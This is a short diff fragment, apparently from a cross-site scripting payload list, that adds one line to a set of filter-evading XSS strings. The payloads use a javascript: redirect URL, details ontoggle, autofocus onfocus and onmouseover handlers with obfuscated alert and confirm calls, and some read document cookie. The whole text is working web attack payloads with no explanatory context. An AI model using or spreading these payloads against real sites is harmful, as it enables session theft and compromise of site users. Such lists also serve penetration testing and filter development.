@@ -128,3 +128,4 @@ login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520docume
 <details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc(VulneravelXSS%26%2300000000000000000041//
 '"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](document%2Bcookie)>
 %3E%3CD3V%0DonMOUseovEr%09=%09["BadrHere"].find(confirm)%0Dx%3Ev3dm0s
+"*alert("Hacked")*"
